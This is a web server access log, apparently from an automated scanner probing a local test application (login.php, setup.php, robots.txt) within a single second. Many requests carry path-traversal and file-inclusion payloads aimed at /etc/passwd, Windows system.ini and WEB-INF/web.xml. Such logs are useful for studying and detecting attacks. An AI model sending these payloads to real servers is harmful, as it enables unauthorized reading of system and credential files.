172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=WEB-INF%2Fweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=WEB-INF%5Cweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=%2Fetc%2Fpasswd HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=c%3A%2F HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=%2F HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=c%3A%5C HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /robots.txt?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 300 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=%2Fetc%2Fpasswd HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=c%3A%2F HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=%2F HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=c%3A%5C HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
